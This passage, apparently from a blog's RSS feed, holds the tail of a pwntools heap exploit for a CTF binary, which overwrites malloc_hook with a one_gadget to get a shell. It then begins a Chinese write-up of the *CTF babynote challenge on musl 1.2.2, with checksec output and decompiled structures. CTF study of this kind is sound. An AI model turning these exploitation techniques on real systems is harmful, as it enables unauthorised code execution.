class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;../&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x70&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;AAAA&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;quot;AAAA&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr = u64(r.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)) - &lt;span class=&#34;number&#34;&gt;0x001470&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake = heap_addr+&lt;span class=&#34;number&#34;&gt;0x2800&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;heap_addr : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(heap_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#onegadget = 0xcafebabedeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onegadget = &lt;span class=&#34;number&#34;&gt;0xe3b31&lt;/span&gt;+libcbase&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;../&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;quot;free&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;actim&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;null&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x2a0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;nop&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;1111&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x110&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;2222&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#clean the chunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;4&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rmv(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x130&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x120&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x130&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;mmmm&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dbg()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;brva 0x01884&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#change the chunksize wo achieve overlap&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;1&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x51\x04&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dbg()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc_hook : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(malloc_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p64(malloc_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad = p64(malloc_hook)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(pad[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(pad[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir2&amp;#x27;&lt;/span&gt;,pad[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dbg()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad = p64(onegadget)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt;)+pad[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;],&lt;span class=&#34;string&#34;&gt;b&amp;#x27;5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;7&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;题目文件在链接里&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/04/19/starctf-babynote/</guid>
            <title>starctf_babynote</title>
            <link>http://example.com/2022/04/19/starctf-babynote/</link>
            <category>writeup</category>
            <pubDate>Tue, 19 Apr 2022 19:37:17 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;starctfbabynote-musl122&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#starctfbabynote-musl122&#34;&gt;#&lt;/a&gt; starctf	babynote musl1.2.2&lt;/h1&gt;
&lt;h2 id=&#34;环境以及保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境以及保护&#34;&gt;#&lt;/a&gt; 环境以及保护&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop&lt;span class=&#34;comment&#34;&gt;/*ctf/babbynote/attachment$ file babynote &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;babynote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ checksec --file=babynote&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	  No	0		2		babynote&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ ./libc.so &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;musl libc (x86_64)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Version 1.2.2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Dynamic Program Loader&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Usage: ./libc.so [options] [--] pathname [args]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一次做 musl 的题目，有点迷茫。一边查资料一边摸着做。比赛的时候没有任何的突破。&lt;/p&gt;
&lt;h2 id=&#34;探索的过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#探索的过程&#34;&gt;#&lt;/a&gt; 探索的过程&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop&lt;span class=&#34;comment&#34;&gt;/*ctf/babbynote/attachment$ ./libc.so babynote &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;                                                   &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;    _/  _/  _/        _/_/_/  _/_/_/_/_/  _/_/_/_/ &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     _/_/_/        _/            _/      _/        &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;  _/_/_/_/_/      _/            _/      _/_/_/     &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;   _/_/_/        _/            _/      _/          &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;_/  _/  _/        _/_/_/      _/      _/           &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;                                                   &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;                                                   &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--------menu-------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;1: add a note&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;2: find a note&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;3: delete a note&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;4: forget all notes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;5: exit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;option:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现并没有 edit 的功能。&lt;/p&gt;
&lt;p&gt;反汇编以后，对于结构体的认知。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; babynote        struc ; (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;, mappedto_6)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; name            dq ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000008&lt;/span&gt; note            dq ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000010&lt;/span&gt; name_size       dq ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000018&lt;/span&gt; note_size       dq ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000020&lt;/span&gt; next            dq ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000028&lt;/span&gt; babynote        ends&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;存在一个全局数组，储存了 abbynote 的指针，形成一个单链表。采用头插法进行添加。&lt;/p&gt;
&lt;h3 id=&#34;add&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#add&#34;&gt;#&lt;/a&gt; add&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  babynote *ptr; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr = (babynote *)&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span 